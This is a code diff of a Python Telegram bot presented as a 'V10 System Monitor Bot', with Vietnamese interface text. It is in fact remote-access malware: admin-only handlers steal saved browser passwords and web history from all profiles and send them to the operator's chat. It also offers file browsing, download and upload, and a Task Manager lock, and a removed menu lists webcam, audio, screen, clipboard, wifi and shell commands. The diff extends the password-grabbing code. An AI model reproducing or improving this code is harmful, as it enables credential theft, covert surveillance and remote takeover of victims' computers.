@@ -4,7 +4,7 @@ V10 - System Monitor Bot
 Main entry point with modular architecture
 
 Developer: TsByin
-Version: 2.0 (Refactored & Optimized)
+Version: 10.0 (Refactored & Optimized)
 """
 
 import sys
@@ -90,34 +90,7 @@ def send_reply_menu(m):
     
     bot.send_message(m.chat.id, "🛡️ **MENU 1 (Bàn Phím)**", reply_markup=mk, parse_mode="Markdown")
 
-def send_inline_menu(m):
-    """Send Inline Keyboard Menu"""
-    mk = types.InlineKeyboardMarkup(row_width=2)
-    btns = [
-        types.InlineKeyboardButton("🔑 Passwords", callback_data="cmd_pass"),
-        types.InlineKeyboardButton("🌐 History", callback_data="cmd_hist"),
-        types.InlineKeyboardButton("🖼 Screen", callback_data="cmd_scr"),
-        types.InlineKeyboardButton("📸 Webcam", callback_data="cmd_cam"),
-        types.InlineKeyboardButton("🎤 Audio", callback_data="cmd_aud"),
-        types.InlineKeyboardButton("🎥 Video", callback_data="cmd_vid"),
-        types.InlineKeyboardButton("🚫 Block", callback_data="cmd_block_toggle"),
-        types.InlineKeyboardButton("🔒 TaskMgr", callback_data="cmd_task"),
-        types.InlineKeyboardButton("⚙️ Process", callback_data="cmd_proc"),
-        types.InlineKeyboardButton("🚀 Shell", callback_data="cmd_shell"),
-        types.InlineKeyboardButton("🔄 Restart", callback_data="cmd_res"),
-        types.InlineKeyboardButton("🛑 Off", callback_data="cmd_off"),
-        types.InlineKeyboardButton("📂 Files", callback_data="cmd_file"),
-        types.InlineKeyboardButton("🚨 Alert", callback_data="cmd_alert"),
-        types.InlineKeyboardButton("📶 Wifi", callback_data="cmd_wifi"),
-        types.InlineKeyboardButton("📋 Clip", callback_data="cmd_clip"),
-        types.InlineKeyboardButton("📦 Apps", callback_data="cmd_apps"),
-        types.InlineKeyboardButton("📍 IP Info", callback_data="cmd_ip"),
-        types.InlineKeyboardButton("🧱 Lock Input", callback_data="cmd_input"),
-        types.InlineKeyboardButton("💓 Check Bot", callback_data="cmd_ping")
-    ]
-    mk.add(*btns)
-    
-    bot.send_message(m.chat.id, "🛡️ **MENU 2 (Nút Bấm)**", reply_markup=mk, parse_mode="Markdown")
+
 
 # ==============================================================================
 # COMMAND HANDLERS
@@ -130,22 +103,7 @@ def menu_handler(m):
         return
     
     try:
-        args = m.text.split()
-        if len(args) > 1:
-            if args[1] == '1':
-                save_settings(SETTINGS_FILE, 1)
-                send_reply_menu(m)
-            elif args[1] == '2':
-                save_settings(SETTINGS_FILE, 2)
-                send_inline_menu(m)
-            else:
-                bot.reply_to(m, "Dùng: /menu 1 hoặc /menu 2")
-        else:
-            # Load saved menu state
-            if CURRENT_SETTINGS["menu_mode"] == 1:
-                send_reply_menu(m)
-            else:
-                send_inline_menu(m)
+        send_reply_menu(m)
     except Exception as e:
         logger.error(f"menu_handler failed: {e}")
 
@@ -178,16 +136,13 @@ def check_status(m):
         return
     
     try:
-        curr_menu = "1 (Bàn Phím)" if CURRENT_SETTINGS["menu_mode"] == 1 else "2 (Nút Bấm)"
-        
         msg = (
             f"🟢 **ONLINE**\n"
             f"⏱ Uptime: {bot_stats.get_stats()['uptime']}\n"
             f"💻 Host: {socket.gethostname()}\n"
             f"🧠 CPU: {bot_stats.get_stats()['cpu']}% | "
             f"💾 RAM: {bot_stats.get_stats()['ram']}%\n"
-            f"🔒 TaskMgr: {'LOCKED' if taskmgr_locked else 'OPEN'}\n"
-            f"📱 Menu: {curr_menu}"
+            f"🔒 TaskMgr: {'LOCKED' if taskmgr_locked else 'OPEN'}"
         )
         bot.reply_to(m, msg, parse_mode="Markdown")
         bot_stats.increment_command()
@@ -214,23 +169,30 @@ def show_stats(m):
 
 @bot.message_handler(func=lambda m: m.text == "🔑 Lấy Passwords")
 def h_pass(m):
-    """Extract and send passwords"""
+    """Extract and send passwords from all profiles"""
     if m.from_user.id != ADMIN_ID:
         return
     
     def task():
         try:
-            bot.send_message(m.chat.id, "⏳ Đang trích xuất mật khẩu...")
-            outfile = grab_passwords(BROWSER_PATHS, compress=True, max_workers=MAX_WORKERS)
+            bot.send_message(m.chat.id, "⏳ Đang trích xuất mật khẩu từ tất cả profiles...")
+            outfiles = grab_passwords(BROWSER_PATHS, compress=True, max_workers=MAX_WORKERS)
             
-            if outfile:
-                with open(outfile, 'rb') as f:
-                    bot.send_document(m.chat.id, f)
+            if outfiles:
+                # outfiles is now a list of files
+                if not isinstance(outfiles, list):
+                    outfiles = [outfiles]
                 
-                cleanup_media_file(outfile)
-                bot_stats.increment_command()
-                bot_stats.add_data_captured(get_media_file_size(outfile))
-                logger.info("Passwords sent successfully")
+                for outfile in outfiles:
+                    try:
+                        with open(outfile, 'rb') as f:
+                            bot.send_document(m.chat.id, f, caption=f"📄 {os.path.basename(outfile)}")
+                        cleanup_media_file(outfile)
+                        bot_stats.increment_command()
+                        logger.info(f"Password file sent: {outfile}")
+                    except Exception as e:
+                        logger.error(f"Send password file failed: {e}")
+                        bot.send_message(m.chat.id, f"❌ Lỗi gửi file: {outfile}")
             else:
                 bot.send_message(m.chat.id, "❌ Không tìm thấy mật khẩu")
         except Exception as e:
@@ -240,22 +202,37 @@ def h_pass(m):
     threading.Thread(target=task, daemon=True).start()
 
 @bot.message_handler(func=lambda m: m.text == "🌐 Lịch Sử Web")
-def task_history_menu(m):
-    """History browser selection menu"""
+def h_history_menu(m):
+    """History with default limit (500 pages from all browsers & profiles)"""
     if m.from_user.id != ADMIN_ID:
         return
     
-    try:
-        installed = get_installed_browsers(BROWSER_PATHS)
-        mk = types.InlineKeyboardMarkup()
-        
-        for b in installed:
-            mk.add(types.InlineKeyboardButton(f"🌐 {b}", callback_data=f"hist_sel|{b}"))
-        
-        bot.send_message(m.chat.id, "👇 Chọn trình duyệt:", reply_markup=mk)
-        bot_stats.increment_command()
-    except Exception as e:
-        logger.error(f"task_history_menu failed: {e}")
+    def task():
+        try:
+            bot.send_message(m.chat.id, "⏳ Đang trích xuất lịch sử web (500 trang) từ tất cả profiles...")
+            outfiles = grab_history_specific(BROWSER_PATHS, browser_name=None, limit=500)
+            
+            if outfiles:
+                if not isinstance(outfiles, list):
+                    outfiles = [outfiles]
+                
+                for outfile in outfiles:
+                    try:
+                        with open(outfile, 'rb') as f:
+                            bot.send_document(m.chat.id, f, caption=f"📄 {os.path.basename(outfile)}")
+                        cleanup_media_file(outfile)
+                        bot_stats.increment_command()
+                        logger.info(f"History file sent: {outfile}")
+                    except Exception as e:
+                        logger.error(f"Send history file failed: {e}")
+                        bot.send_message(m.chat.id, f"❌ Lỗi gửi file: {outfile}")
+            else:
+                bot.send_message(m.chat.id, "❌ Không tìm thấy lịch sử web")
+        except Exception as e:
+            logger.error(f"h_history_menu failed: {e}")
+            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
+    
+    threading.Thread(target=task, daemon=True).start()
 
 # ==============================================================================
 # MEDIA CAPTURE
@@ -685,135 +662,6 @@ def block_mgr(m):
 # CALLBACK HANDLER
 # ==============================================================================
 
-CALLBACK_MAP = {
-    "cmd_pass": h_pass,
-    "cmd_hist": task_history_menu,
-    "cmd_scr": h_scr,
-    "cmd_cam": h_cam,
-    "cmd_aud": h_aud,
-    "cmd_vid": h_vid,
-    "cmd_block_toggle": toggle_block,
-    "cmd_task": toggle_taskmgr,
-    "cmd_proc": h_proc,
-    "cmd_shell": lambda m: bot.send_message(m.chat.id, "Gõ: `/cmd <lệnh>`", parse_mode="Markdown"),
-    "cmd_res": h_res,
-    "cmd_off": h_off,
-    "cmd_file": h_exp,
-    "cmd_alert": h_alert,
-    "cmd_wifi": h_wifi,
-    "cmd_clip": h_clip,
-    "cmd_apps": lambda m: bot.send_message(m.chat.id, "📦 Feature coming soon"),
-    "cmd_ip": h_loc,
-    "cmd_input": h_blockinput,
-    "cmd_ping": check_status,
-}
-
-@bot.callback_query_handler(func=lambda c: c.from_user.id == ADMIN_ID)
-def cb_handler(c):
-    """Unified callback handler"""
-    data = c.data
-    msg = c.message
-    cid = msg.chat.id
-    
-    try:
-        logger.info(f"Callback received: {data}")
-        
-        # Check direct callbacks
-        if data in CALLBACK_MAP:
-            bot.answer_callback_query(c.id, "⏳ Đang xử lý...")
-            handler = CALLBACK_MAP[data]
-            
-            # Run handler in thread to avoid blocking
-            def run_handler():
-                try:
-                    handler(msg)
-                    logger.info(f"Callback {data} executed successfully")
-                except Exception as e:
-                    logger.error(f"Callback {data} failed: {e}", exc_info=True)
-                    bot.send_message(cid, f"❌ Lỗi thực thi: {e}")
-            
-            threading.Thread(target=run_handler, daemon=True).start()
-        
-        # History selection
-        elif data.startswith("hist_sel|"):
-            browser = data.split("|")[1]
-            mk = types.InlineKeyboardMarkup()
-            for limit in [100, 500, 1000]:
-                mk.add(types.InlineKeyboardButton(f"{limit} dòng", 
-                                                  callback_data=f"hist_run|{browser}|{limit}"))
-            bot.edit_message_text(f"🌐 {browser}: Chọn số lượng", 
-                                 cid, msg.message_id, reply_markup=mk)
-            bot.answer_callback_query(c.id, "✅")
-        
-        # History execution
-        elif data.startswith("hist_run|"):
-            _, browser, limit = data.split("|")
-            bot.answer_callback_query(c.id, "Đang tải history...")
-            
-            def task():
-                try:
-                    outfile = grab_history_specific(BROWSER_PATHS, browser, int(limit))
-                    if outfile:
-                        with open(outfile, 'rb') as f:
-                            bot.send_document(cid, f, 
-                                            caption=f"History: {browser}")
-                        cleanup_media_file(outfile)
-                        bot_stats.increment_command()
-                        logger.info(f"History sent: {browser}")
-                    else:
-                        bot.send_message(cid, f"❌ Không tìm được history")
-                except Exception as e:
-                    logger.error(f"History download failed: {e}", exc_info=True)
-                    bot.send_message(cid, f"❌ Lỗi: {e}")
-            
-            threading.Thread(target=task, daemon=True).start()
-        
-        # Directory browse
-        elif data.startswith("d|"):
-            path = data.split("|", 1)[1]
-            bot.answer_callback_query(c.id, "✅")
-            try:
-                bot.delete_message(cid, msg.message_id)
-            except:
-                pass
-            list_dir(cid, path)
-        
-        # File download
-        elif data.startswith("f|"):
-            filepath = data.split("|", 1)[1]
-            bot.answer_callback_query(c.id, "Đang tải file...")
-            
-            def download_task():
-                try:
-                    with open(filepath, 'rb') as f:
-                        bot.send_document(cid, f)
-                    logger.info(f"File sent: {filepath}")
-                except Exception as e:
-                    logger.error(f"File download failed: {e}", exc_info=True)
-                    bot.send_message(cid, f"❌ Lỗi tải file: {e}")
-            
-            threading.Thread(target=download_task, daemon=True).start()
-        
-        # File upload
-        elif data.startswith("up|"):
-            target_path = data.split("|", 1)[1]
-            upload_state[cid] = target_path
-            bot.answer_callback_query(c.id, "✅")
-            bot.send_message(cid, 
-                            f"📤 Hãy gửi file (<20MB) để lưu vào: `{target_path}`", 
-                            parse_mode="Markdown")
-        
-        else:
-            logger.warning(f"Unknown callback: {data}")
-            bot.answer_callback_query(c.id, "❌ Lệnh không nhận diện")
-    
-    except Exception as e:
-        logger.error(f"Callback handler critical error: {e}", exc_info=True)
-        try:
-            bot.answer_callback_query(c.id, f"❌ Lỗi: {str(e)[:50]}")
-        except:
-            pass
-
 @bot.message_handler(content_types=['document'])
 def handle_upload(m):
     """Handle file upload"""
@@ -847,6 +695,67 @@ def handle_upload(m):
     except Exception as e:
         logger.error(f"File upload failed: {e}")
         bot.reply_to(m, f"❌ Lỗi: {e}")
+
+# ==============================================================================
+# CALLBACK HANDLER (File browser only)
+# ==============================================================================
+
+@bot.callback_query_handler(func=lambda c: c.from_user.id == ADMIN_ID)
+def cb_handler(c):
+    """Callback handler for file browser (d| and f| callbacks)"""
+    data = c.data
+    msg = c.message
+    cid = msg.chat.id
+    
+    try:
+        # Directory browse
+        if data.startswith("d|"):
+            path = data.split("|", 1)[1]
+            bot.answer_callback_query(c.id, "✅")
+            try:
+                bot.delete_message(cid, msg.message_id)
+            except:
+                pass
+            list_dir(cid, path)
+            return
+        
+        # File download
+        if data.startswith("f|"):
+            filepath = data.split("|", 1)[1]
+            bot.answer_callback_query(c.id, "Đang tải file...")
+            
+            def download_task():
+                try:
+                    with open(filepath, 'rb') as f:
+                        bot.send_document(cid, f)
+                    logger.info(f"File sent: {filepath}")
+                except Exception as e:
+                    logger.error(f"File download failed: {e}")
+                    bot.send_message(cid, f"❌ Lỗi tải file: {e}")
+            
+            threading.Thread(target=download_task, daemon=True).start()
+            return
+        
+        # File upload
+        if data.startswith("up|"):
+            target_path = data.split("|", 1)[1]
+            upload_state[cid] = target_path
+            bot.answer_callback_query(c.id, "✅")
+            bot.send_message(cid, 
+                            f"📤 Hãy gửi file (<20MB) để lưu vào: `{target_path}`", 
+                            parse_mode="Markdown")
+            return
+        
+        # Unknown callback
+        logger.warning(f"❌ Unknown callback: {data}")
+        bot.answer_callback_query(c.id, "❌ Lệnh không nhận diện")
+    
+    except Exception as e:
+        logger.error(f"❌ Callback handler error: {e}", exc_info=True)
+        try:
+            bot.answer_callback_query(c.id, f"❌ Lỗi: {str(e)[:50]}")
+        except:
+            pass
 
 # ==============================================================================
 # MAIN
@@ -896,5 +805,5 @@ if __name__ == "__main__":
 # ═══════════════════════════════════════════════════════════════
 # Developer: TsByin
 # Project: V10 System Monitor Bot - Refactored & Optimized
-# Version: 2.0 (Modular Architecture with Concurrent Operations)
+# Version: 10.0 (Modular Architecture with Concurrent Operations)
 # ═══════════════════════════════════════════════════════════════
